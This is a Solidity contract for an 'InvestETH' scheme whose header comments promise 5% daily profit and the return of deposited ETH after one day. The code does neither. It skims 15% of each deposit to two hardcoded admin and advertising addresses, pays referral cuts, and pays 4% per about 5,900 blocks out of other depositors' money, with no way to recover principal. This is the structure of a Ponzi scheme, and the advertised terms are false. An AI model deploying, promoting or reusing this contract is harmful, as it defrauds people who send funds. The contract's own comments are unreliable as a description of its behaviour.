// Invest ETH 
// 5% Profit/days

// How to INVEST ETH and Get 5% Profit/days ?

//Send ETH to Contract 0x6d74D4Bf725D296CA3A8eF806bFf40488E72C51d

//1 day after successfully sending eth to the contract will receive your eth again and 5% as profit


pragma solidity ^0.4.25;

library SafeMath {
  function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    if (_a == 0) {
      return 0;
    }
    c = _a * _b;
    assert(c / _a == _b);
    return c;
  }

  function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
    return _a / _b;
  }

  function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
    assert(_b <= _a);
    return _a - _b;
  }

  function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {
    c = _a + _b;
    assert(c >= _a);
    return c;
  }
}

contract InvestETH {
	using SafeMath for uint256;

	address public constant admAddress = 0x5df65e16d6EC1a8090ffa11c8185AD372A8786Cd;
	address public constant advAddress = 0x670b45f2A8722bF0c01927cf4480fE17d8643fAa;

	mapping (address => uint256) deposited;
	mapping (address => uint256) withdrew;
	mapping (address => uint256) refearned;
	mapping (address => uint256) blocklock;

	uint256 public totalDepositedWei = 0;
	uint256 public totalWithdrewWei = 0;

	function() payable external {
		uint256 admRefPerc = msg.value.mul(5).div(100);
		uint256 advPerc = msg.value.mul(10).div(100);

		advAddress.transfer(advPerc);
		admAddress.transfer(admRefPerc);

		if (deposited[msg.sender] != 0) {
			address investor = msg.sender;
			uint256 depositsPercents = deposited[msg.sender].mul(4).div(100).mul(block.number-blocklock[msg.sender]).div(5900);
			investor.transfer(depositsPercents);

			withdrew[msg.sender] += depositsPercents;
			totalWithdrewWei = totalWithdrewWei.add(depositsPercents);
		}

		address referrer = bytesToAddress(msg.data);
		if (referrer > 0x0 && referrer != msg.sender) {
			referrer.transfer(admRefPerc);

			refearned[referrer] += admRefPerc;
		}

		blocklock[msg.sender] = block.number;
		deposited[msg.sender] += msg.value;

		totalDepositedWei = totalDepositedWei.add(msg.value);
	}

	function userDepositedWei(address _address) public view returns (uint256) {
		return deposited[_address];
    }

	function userWithdrewWei(address _address) public view returns (uint256) {
		return withdrew[_address];
    }

	function userDividendsWei(address _address) public view returns (uint256) {
		return deposited[_address].mul(4).div(100).mul(block.number-blocklock[_address]).div(5900);
    }

	function userReferralsWei(address _address) public view returns (uint256) {
		return refearned[_address];
    }

	function bytesToAddress(bytes bys) private pure returns (address addr) {
		assembly {
			addr := mload(add(bys, 20))
		}
	}
}